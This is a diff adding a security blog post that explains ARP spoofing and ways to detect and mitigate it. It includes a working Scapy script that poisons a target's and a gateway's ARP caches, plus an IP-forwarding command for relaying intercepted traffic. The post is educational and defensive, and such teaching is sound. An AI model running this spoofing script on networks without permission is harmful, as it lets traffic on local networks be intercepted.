@@ -1,0 +1,179 @@
+---
+title: "ARP Spoofing / Poisoning: How It Works and How to Defend Against It"
+date: "2026-03-30"
+description: "A deep dive into ARP spoofing attacks — how ARP works, the mechanics of poisoning a cache, and practical mitigation strategies with Scapy examples."
+tags: ["Cybersecurity", "Networking", "Python", "Scapy"]
+published: true
+---
+
+## What Is ARP?
+
+The **Address Resolution Protocol (ARP)** is a Layer 2 protocol used to map an IP address to a MAC (hardware) address on a local network. When a device wants to communicate with `192.168.1.1`, it broadcasts an ARP request:
+
+> "Who has 192.168.1.1? Tell 192.168.1.50"
+
+The owner of that IP replies with its MAC address. The requester caches this mapping in its **ARP table** (also called ARP cache) for future use.
+
+```
+$ arp -a
+? (192.168.1.1) at aa:bb:cc:dd:ee:ff [ether] on eth0
+? (192.168.1.50) at 11:22:33:44:55:66 [ether] on eth0
+```
+
+ARP was designed in 1982 (RFC 826) with zero authentication. Any host can send an ARP reply at any time, and most systems will accept and cache it — even if they never sent a request. This is the root of ARP spoofing.
+
+## How ARP Spoofing Works
+
+ARP spoofing (also called ARP poisoning) is a Man-in-the-Middle (MitM) attack on a local network. An attacker sends **gratuitous ARP replies** to trick two hosts into associating the attacker's MAC address with each other's IP addresses.
+
+### Attack Flow
+
+1. **Network topology**: Victim A (`192.168.1.10`), Victim B / Gateway (`192.168.1.1`), Attacker (`192.168.1.99`)
+2. **Attacker sends forged ARP replies**:
+   - To A: "192.168.1.1 is at `attacker_mac`"
+   - To the gateway: "192.168.1.10 is at `attacker_mac`"
+3. Both victims update their ARP caches with the attacker's MAC.
+4. All traffic between A and the gateway now flows through the attacker.
+5. With IP forwarding enabled on the attacker machine, traffic is relayed transparently — classic MitM.
+
+```
+Before poisoning:
+  A ──────────────────────────── Gateway
+  A's ARP cache: 192.168.1.1 → aa:bb:cc:dd:ee:ff (correct)
+
+After poisoning:
+  A ─────── Attacker ─────────── Gateway
+  A's ARP cache: 192.168.1.1 → 99:99:99:99:99:99 (attacker's MAC)
+```
+
+## Performing ARP Spoofing with Scapy
+
+> **Disclaimer**: Only perform this on networks you own or have explicit written permission to test.
+
+[Scapy](https://scapy.net/) is a powerful Python library for packet crafting and manipulation.
+
+```python title="arp_spoof.py"
+#!/usr/bin/env python3
+"""
+ARP Spoof — educational demo
+Usage: sudo python3 arp_spoof.py <target_ip> <gateway_ip>
+"""
+import sys
+import time
+import scapy.all as scapy
+
+def get_mac(ip: str) -> str:
+    """Resolve MAC address for a given IP via ARP."""
+    arp_request = scapy.ARP(pdst=ip)
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    packet = broadcast / arp_request
+    answered, _ = scapy.srp(packet, timeout=2, verbose=False)
+    if not answered:
+        raise RuntimeError(f"Could not resolve MAC for {ip}")
+    return answered[0][1].hwsrc
+
+def spoof(target_ip: str, spoof_ip: str) -> None:
+    """Send a forged ARP reply to target_ip claiming we are spoof_ip."""
+    target_mac = get_mac(target_ip)
+    packet = scapy.ARP(
+        op=2,           # ARP reply
+        pdst=target_ip,
+        hwdst=target_mac,
+        psrc=spoof_ip,
+        # hwsrc defaults to our own MAC
+    )
+    scapy.send(packet, verbose=False)
+
+def restore(dest_ip: str, src_ip: str) -> None:
+    """Restore correct ARP mappings on cleanup."""
+    dest_mac = get_mac(dest_ip)
+    src_mac = get_mac(src_ip)
+    packet = scapy.ARP(
+        op=2,
+        pdst=dest_ip,
+        hwdst=dest_mac,
+        psrc=src_ip,
+        hwsrc=src_mac,
+    )
+    scapy.send(packet, count=4, verbose=False)
+
+if __name__ == "__main__":
+    target_ip, gateway_ip = sys.argv[1], sys.argv[2]
+    sent = 0
+    print(f"[*] Poisoning ARP cache: {target_ip} ↔ {gateway_ip}")
+    print("    Press Ctrl+C to stop and restore ARP tables.\n")
+    try:
+        while True:
+            spoof(target_ip, gateway_ip)
+            spoof(gateway_ip, target_ip)
+            sent += 2
+            print(f"\r[*] Packets sent: {sent}", end="", flush=True)
+            time.sleep(2)
+    except KeyboardInterrupt:
+        print("\n[*] Restoring ARP tables…")
+        restore(target_ip, gateway_ip)
+        restore(gateway_ip, target_ip)
+        print("[+] Done.")
+```
+
+Enable IP forwarding so traffic isn't dropped:
+
+```bash
+# Linux
+echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
+```
+
+## Detecting ARP Spoofing
+
+### Method 1: Static ARP Entries
+
+Manually set a static ARP entry for the gateway:
+
+```bash
+sudo arp -s 192.168.1.1 aa:bb:cc:dd:ee:ff
+```
+
+This prevents the entry from being overwritten by gratuitous replies.
+
+### Method 2: ARP Monitoring with Scapy
+
+A simple passive detector that watches for MAC changes on the network:
+
+```python title="arp_detector.py"
+import scapy.all as scapy
+
+arp_table: dict[str, str] = {}
+
+def detect(packet: scapy.Packet) -> None:
+    if packet.haslayer(scapy.ARP) and packet[scapy.ARP].op == 2:
+        ip = packet[scapy.ARP].psrc
+        mac = packet[scapy.ARP].hwsrc
+        if ip in arp_table and arp_table[ip] != mac:
+            print(f"[!] ARP SPOOF DETECTED: {ip}")
+            print(f"    Known MAC : {arp_table[ip]}")
+            print(f"    New MAC   : {mac}")
+        else:
+            arp_table[ip] = mac
+
+print("[*] Listening for ARP packets… (Ctrl+C to quit)")
+scapy.sniff(filter="arp", prn=detect, store=False)
+```
+
+### Method 3: Network-Level Controls
+
+| Control | Description |
+|---|---|
+| **Dynamic ARP Inspection (DAI)** | Managed switches validate ARP packets against a DHCP snooping binding table |
+| **802.1X Port Authentication** | Only authenticated devices can connect to switch ports |
+| **VLANs** | Segment the network to limit blast radius |
+| **Encrypted protocols** | HTTPS, SSH, TLS — even with MitM, data is encrypted |
+
+## Mitigation Summary
+
+- **Use DAI** on managed switches — this is the most effective network-level defense.
+- **Enforce HTTPS everywhere** — ARP poisoning alone won't decrypt TLS traffic.
+- **Static ARP entries** for critical hosts (gateway, DNS server).
+- **Monitor ARP traffic** for anomalies using IDS tools (Snort, Suricata, XArp).
+- **Keep networks segmented** — isolate IoT, guest, and internal VLANs.
+
+ARP spoofing is one of the oldest tricks in the book, but it remains relevant on unmanaged or misconfigured networks. Understanding it at the packet level is foundational for anyone serious about network security.
